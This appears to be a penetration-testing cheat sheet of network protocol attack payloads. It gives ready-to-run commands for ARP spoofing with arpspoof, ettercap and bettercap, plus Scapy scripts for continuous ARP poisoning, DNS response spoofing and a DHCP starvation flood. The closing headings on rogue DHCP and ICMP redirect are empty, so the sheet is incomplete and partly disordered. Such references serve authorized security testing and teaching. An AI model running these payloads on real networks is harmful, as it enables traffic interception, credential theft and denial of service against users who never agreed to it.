# Protocol Attack Payloads

## ARP Spoofing / Poisoning

### ARPSpoof (dsniff)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1                          # Spoof victim to gateway
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100                          # Spoof gateway to victim
arpspoof -i eth0 -r 192.168.1.100 192.168.1.1                          # Bidirectional spoofing

### Ettercap
ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/       # ARP poisoning MITM
ettercap -T -q -i eth0 -M arp /192.168.1.100// ///                    # Poison single target
ettercap -G                                                            # GUI mode
ettercap -T -i eth0 -M arp /// ///                                     # Poison entire network
ettercap -T -i eth0 -M arp -P autoadd /192.168.1.0/24//               # Auto-add targets

### Bettercap
bettercap -iface eth0                                                  # Start interactive
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on"
bettercap -iface eth0 -eval "set arp.spoof.fullduplex true; arp.spoof on; net.sniff on"

### Scapy ARP Spoofing
python3 << 'EOF'
from scapy.all import *
import time

target_ip = "192.168.1.100"
gateway_ip = "192.168.1.1"

# Get MAC addresses
target_mac = getmacbyip(target_ip)
gateway_mac = getmacbyip(gateway_ip)

# Create ARP packets
arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

# Send packets continuously
while True:
    send(arp_target, verbose=False)
    send(arp_gateway, verbose=False)
    time.sleep(2)
EOF

### DNS Cache Poisoning with Scapy
python3 << 'EOF'
from scapy.all import *

# Intercept DNS query and respond with fake answer
def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="192.168.1.50"))
        send(spoofed_pkt, verbose=0)

sniff(filter="udp port 53", prn=dns_spoof)
EOF

# Using Scapy
python3 << 'EOF'
from scapy.all import *
import random

def random_mac():
    return ":".join(["{:02x}".format(random.randint(0, 255)) for _ in range(6)])

for i in range(100):
    mac = random_mac()
    dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / \
                    IP(src="0.0.0.0", dst="255.255.255.255") / \
                    UDP(sport=68, dport=67) / \
                    BOOTP(chaddr=mac) / \
                    DHCP(options=[("message-type", "discover"), "end"])
    sendp(dhcp_discover, iface="eth0", verbose=False)
EOF

### Rogue DHCP Server

## ICMP Attacks

### ICMP Redirect
